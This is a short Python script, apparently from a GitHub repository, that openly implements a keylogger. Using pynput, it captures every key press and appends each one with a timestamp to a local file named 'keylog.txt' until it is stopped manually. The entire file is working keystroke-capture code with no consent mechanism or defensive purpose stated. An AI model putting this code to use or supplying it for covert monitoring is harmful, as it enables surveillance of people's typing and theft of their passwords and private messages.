"""
USAGE - This code imports the required modules for monitoring and logging keyboard input. 
        It sets up a logging configuration and creates a function to log each key press. 
        It then initializes a Listener object and starts listening for key presses. 
        When a key is pressed, the on_press function is called, which logs the key press 
        to a file called "keylog.txt" using the logging module. The listener continues 
        running until it is stopped manually.
        
AUTHOR - https://github.com/Ahendrix9624/
"""

from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener :
    listener.join()
